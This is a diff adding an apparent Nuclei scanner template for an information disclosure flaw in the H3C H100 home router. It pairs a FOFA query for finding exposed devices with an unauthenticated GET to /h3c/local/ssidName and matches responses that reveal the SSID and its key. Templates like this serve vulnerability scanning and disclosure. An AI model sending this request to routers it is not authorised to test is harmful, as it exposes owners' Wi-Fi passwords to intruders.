@@ -1,0 +1,31 @@
+id: h3c-h100-router-discloure
+info:
+  name: h3c-h100-router-discloure
+  author: leadlife
+  severity: high
+  description: 这是一款家用双频无线路由器，支持Wi-Fi 5（1167Mbps），2.4GHz（300Mbps）和5GHz（867Mbps）双频并发，覆盖更广。提供千兆WAN口和百兆LAN口，支持APP远程管理、家长控制、防蹭网等功能，安装简单，适合家庭和小型办公使用。高性价比，稳定易用。H3C-H100路由器信息泄露漏洞,可泄露用户泄露密码。在H3C设备的配置文件中，/h3c/local/ssidName 可能表示存储或调用SSID名称的本地路径（如Linux系统文件结构或设备内部文件管理）。
+  reference: 
+    - https://mp.weixin.qq.com/s?__biz=MzE5MTM2MjA0NQ==&mid=2247483677&idx=1&sn=db90b33aac652e9d09928b3973955e97&chksm=9606e78fa1716e994df2c62a88fb1ef7ca7e506c9dd9101f0d115153648ea8b94e657b1fcca6&cur_album_id=4045056277938913283&scene=189#wechat_redirect
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: body="/grwizard/h3c.ico"
+    tips:
+    repair:
+    version:
+  tags: h3c,h100,disclosure
+
+http:
+  - raw:
+      - |
+        GET /h3c/local/ssidName HTTP/1.1
+        Host: {{Hostname}}
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'ssidName','ssidKey')
+          - contains(header,'application/json')
+        condition: and
